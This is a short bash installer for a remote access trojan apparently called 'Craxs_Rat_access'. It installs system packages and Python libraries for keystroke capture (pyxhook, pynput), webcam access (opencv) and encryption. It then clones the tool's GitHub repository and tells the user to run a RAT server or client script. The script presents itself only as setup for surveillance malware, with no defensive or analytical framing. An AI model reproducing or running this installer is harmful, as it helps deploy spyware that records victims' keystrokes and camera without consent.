#!/bin/bash
echo "[+] Installing aaayafuj_Craxs_Rat_access..."

sudo apt update
sudo apt install -y git python3 python3-pip openssl

pip3 install Flask pyxhook pynput opencv-python cryptography

git clone https://github.com/YafetTesfahuney/aaayafuj_Craxs_Rat_access.git
cd aaayafuj_Craxs_Rat_access

echo "[+] Installed. Run 'python3 rat_server.py' or 'rat_client.py'"
